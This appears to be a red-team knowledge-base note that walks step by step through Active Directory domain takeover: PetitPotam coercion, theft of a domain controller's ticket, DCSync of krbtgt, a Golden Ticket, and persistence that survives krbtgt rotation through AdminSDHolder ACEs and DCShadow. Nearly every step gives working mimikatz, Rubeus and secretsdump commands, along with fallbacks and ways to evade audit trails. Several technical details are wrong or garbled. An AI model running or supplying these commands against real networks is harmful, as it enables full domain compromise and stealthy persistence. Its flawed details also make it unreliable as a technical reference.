---
title: "Attack Path: Coercion → Unconstrained Delegation → DCSync → Persistence"
type: note
created: 2026-06-13
updated: 2026-08-17
tags: [attack-path, active-directory, domain-dominance, persistence]
---

# Attack Path: Coercion → Unconstrained Delegation → DCSync → Persistence

The classic "print spooler / PetitPotam" chain to full domain compromise,
followed by laying down persistence so the foothold survives credential
rotation.

## Chain

```
You (local admin on HOST with unconstrained delegation)
  --coerce DC to auth (PetitPotam/[[printer-bug|Printer Bug]])--> DC$ TGT cached on HOST
  --extract DC$ TGT--> DCSync as DC$
  --DCSync krbtgt--> Golden Ticket
  --Golden Ticket--> DA everywhere
  --(optional) AdminSDHolder/DCShadow ([[ad-persistence]])--> durable persistence
```

## Prerequisites / what signals this path exists

You need a machine with the **UnrestrictedDelegation** flag AND local
admin/SYSTEM on it AND a known or coercible DC. Confirm each:

```powershell
# Which hosts are unconstrained?
Get-DomainComputer -Unconstrained -Properties dnshostname,unconstraineddelegation

# Confirm you're already local admin / SYSTEM on one of them
whoami /groups
# and that you can reach a DC over the RPC services PetitPotam uses (135/tcp, dynamic)
Test-NetConnection -ComputerName dc01.corp.local -Port 135
```
See [[kerberos-delegation-abuse]]. If you don't have local admin on an
unconstrained box yet, you need lateral movement / local privesc first — this
path is the *explore* step, not the foothold.

## Step 0 — Find an unconstrained delegation host
```powershell
Get-DomainComputer -Unconstrained -Properties dnshostname,distinguishedname
```
You need local admin/SYSTEM on this host. See [[kerberos-delegation-abuse]].

**Verify:** pick the host with the most reachable DC and confirm `whoami
/all` on it shows `BUILTIN\Administrators`.

## Step 1 — Coerce the DC to authenticate to your host
```bash
python3 PetitPotam.py <attacker-controlled-unconstrained-host> <dc-ip>
# alternative: PrinterBug / PrinterBug445 ([[printer-bug]]) for a different RPC path
```
This causes `DC01$` to authenticate to your host via MS-EFSRPC; because
your host has unconstrained delegation, the DC's TGT gets cached in LSASS.

**Verify the coercion fired:** on the DC (if you have eyes) events 4624/4697
from your host; on your host, the TGT should now be in LSASS.

### Failure modes & fallbacks
- **PetitPotam times out / no response** — the DC's EFSRPC endpoint isn't
  responding on the guessed port. Retry with an explicit `-ep` or try
  `Impacket-EFSRPC`; confirm 135 → the dynamic port is reachable.
- **DC$ TGT appears but in the *wrong* LSASS** — if you're on a member box,
  you're reading *your own* box's LSASS. If not there, the TGT may be cached
  on a different process; re-run `Rubeus monitor` (below) rather than a
  one-shot `dump`.
- **`PRC_EFT_...` EFSRPC errors** — the unconstrained flag
  (`msDS-AllowedToDelegateTo` = `TRUE`) lives on **your host**, not the DC;
  if the TGT doesn't cache, confirm it's actually set via
  `Get-ADComputer <host> -Properties msDS-AllowedToDelegateTo`.
- **WMI/PrinterBug path** — if EFSRPC is filtered, [[printer-bug|`PrinterBug`]]
  (spoolss) is a valid substitute; needs the print service up on the target DC.

## Step 2 — Harvest the DC machine account's TGT
```powershell
Rubeus.exe monitor /interval:5 /filteruser:DC01$        # watch for the TGT to appear
# or, once seen:
Rubeus.exe dump /service:krbtgt /user:DC01$ /nowrap /ptt
```

**Verify:** `Rubeus.exe triage` lists a TGT for `DC01$`. If not present,
re-run Step 1 while `monitor` is active (coercion is a one-shot; the TGT
has a finite lifetime).

### Failure modes & fallbacks
- **TGT not in LSASS** — `Rubeus dump` reads LSASS from the current
  process context; on a domain-joined, non-DC box the `DC01$` TGT is cached
  in *your* LSASS after the delegate. If empty, your local admin context
  isn't SYSTEM — escalate (`SeImpersonatePrivilege` + `Rubeus.exe
  s4u`/`incognito`, or `npxe`/`juiceshop` impersonation) so LSASS holds it.
- **`monitor` sees it but `dump` can't** — timing race. Trigger
  coercion + immediately `dump` in the same 10-20s window; `monitor` is
  just to *confirm* it happened.

## Step 3 — DCSync as DC01$
```bash
# confirm replication rights first
Get-ADReplicationPartners -Server dc01.corp.local
# then dump krbtgt
secretsdump.py -k -no-pass corp.local/DC01$@dc01.corp.local -just-dc-user krbtgt
```
See [[dcsync]].

**Verify:** `krbtgt` AES256 key printed. That's the material for Step 4.

### Failure modes & fallbacks
- **`DC01$` authenticates but DCSync is rejected** — a DC authenticating to
  *itself*'s DRSUAPI is normally fine; if you're hitting a RODC or a
  read-replica that doesn't grant `GetChanges`, retarget the writable DC.
 - **Alternative: local ntds.dit** — if you're on the DC (via
   [[kerberos-delegation-abuse|RBCD]] or a jump), mount its disk and
   `secretsdump.py -ntds`. Slower but bypasses DRSUAPI ACL checks.
- **Mimikatz**: `lsadump::dcsync /domain:corp.local /user:krbtgt`.

## Step 4 — Golden Ticket for durable domain-wide access
```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<krbtgt_aes256key> /ptt
whoami /all   # -> corp.local\administrator
```
See [[golden-silver-tickets]].

**Verify:** `Rubeus triage` shows the Administrator TGT; validate against a
live DC with `whoami /userid` (or `psexec.py -k` to a DC).

### Failure modes & fallbacks
- **Golden Ticket rejected, RC4 vs AES mismatch** — rebuild with
  `/rc4:<key>` if the domain still honors RC4, or verify you used the AES256
  (`aes256-cts-hmac...`) not AES128 key from DCSync output.
- **`S-1-5-21-...` wrong** — use the *domain* SID (`Get-Domain` →
  `objectSid`), not the forest root, and not the DC machine's SID.

## Step 5 — Persistence beyond krbtgt rotation
A `krbtgt` rotation (the standard remediation for Golden Ticket) does NOT
remove these. Pick based on engagement persistence requirements:

```powershell
# AdminSDHolder ACE — self-heals onto Domain Admins every SDProp cycle
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker -Rights All

# DCShadow — push sIDHistory granting Enterprise Admins to a low-priv account,
# bypassing the normal attribute-write audit trail
mimikatz # lsadump::dcshadow /object:attacker /attribute:sIDHistory /value:S-1-5-21-...-519
mimikatz # lsadump::dcshadow /push
```
See [[ad-persistence]] ([[dcshadow]], [[skeleton-key]]).

**Verify the ACE stuck** after one SDProp cycle:
```powershell
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local"
# and that it propagated:
Get-DomainObjectAcl -Identity "corp.local\attacker"
```

### Failure modes & fallbacks
- **AdminSDHolder ACE not applying to your account** — your account must be
  a *member* of a group targeted by the holder, or the ACE's
  `PrincipalIdentity` must be the account/group you control. Confirm the
  account is actually in the DCScope the holder covers.
- **DCShadow push rejects (replication partner)** — you need write access
  to at least one DC's `cn=Configuration` partition; if the push fails,
  target a specific DC with `/dcsrv:<dc>` or fall back to
  `mimikatz # ldap::connect` + manual `msDS-...` writes.

## Detection summary (per step)

| Step | What fires | What the analyst sees | Your tell |
|------|-----------|----------------------|-----------|
| 1 coercion | 4624/4697 from your box to DC; 5805 (if EFS) | A DC authenticating to a member/workstation | `DC01$` → non-DC source IP |
| 2 harvest | local LSASS read (4656/4663 on LSASS) | Local admin reading LSASS on a member box | `LSASS` handle with `VmRead` |
| 3 DCSync | 4662 on domain (`GetChanges`/`GetChangesAll`) | Machine-account performing replication | `DC01$` as client for DRSUAPI |
| 4 Golden | 4768 TGT with non-standard lifetime; 4607 (krbtgt changed if they rotate) | TGT outliving domain max; `krbtgt` reset | `Administrator` TGT on a workstation |
| 5 persistence | 4662 on AdminSDHolder / DC's Configuration partition | ACL change on a protected object, or unexpected replication | `sdprop`-like ACE; `dcshadow` replication |

## Related
- [[kerberos-delegation]] — the UDE/CDE/RBCD hub (step 0-2 mechanism)
- [[kerberos-delegation-abuse]] — the raw source summary
- [[dcsync]], [[golden-silver-tickets]] — steps 3-4
- [[ad-persistence]] — step 5
- [[esc8-ntlm-relay-adcs]] — an alternative coercion→cert→DCSync chain via AD CS instead of unconstrained delegation
